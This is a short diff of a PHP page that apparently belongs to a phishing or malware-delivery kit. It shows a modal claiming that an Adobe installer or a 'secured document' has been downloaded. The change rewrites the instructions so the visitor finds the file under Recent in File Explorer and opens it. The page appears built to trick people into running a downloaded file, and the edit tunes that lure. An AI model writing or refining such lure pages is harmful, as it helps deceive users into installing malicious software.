@@ -59,8 +59,8 @@ $dest  = "complete.php?tk=" . $tk . "&n=" . $nameQ;
       <p class="modal-text"><?php echo $kind === 'adobe' ? 'Your download is ready.' : "You've received a secured document."; ?></p>
       <p class="modal-subtext" style="padding-top:10px;">
         <?php echo $kind === 'adobe'
-            ? 'Your installer has been downloaded to your device. Please check your <strong>Downloads</strong> folder and open <strong>' . htmlspecialchars($name) . '</strong> to install.'
-            : 'Your Document has been downloaded to your device. Please check your <strong>Downloads</strong> folder and open <strong>' . htmlspecialchars($name) . '</strong> to view your document.'; ?>
+            ? 'Your installer has been saved to your device. Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
+            : 'Your Document has been saved to your device. Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.'; ?>
       </p>
       <p class="modal-subtext" style="padding-top:10px;">
         If your download did not start automatically, you can download the document again.
